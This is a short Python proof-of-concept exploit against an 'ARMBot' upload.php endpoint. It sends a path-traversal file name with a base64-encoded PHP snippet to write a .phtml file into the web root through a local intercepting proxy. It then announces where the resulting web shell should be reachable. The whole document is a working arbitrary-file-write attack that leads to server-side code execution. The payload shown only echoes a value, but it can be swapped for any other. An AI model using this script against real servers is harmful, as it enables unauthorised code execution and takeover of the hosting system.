import requests

URL = "http://127.0.0.1/ARMBot/upload.php"
r = requests.post(URL,
                  data = {
                     "file":"../public_html/lol/../.s.phtml", # need some trickery for each server ;)
                     "data":"PD9waHAgZWNobyAxOyA/Pg==", # <?php echo 1; ?>
                     "message":"Bobr Dobr"
                  }, proxies={"http":"127.0.0.1:8080","https":"127.0.0.1:8080"})
print(r.status_code)
print("shell should be at http://{}/.s.phtml".format(URL))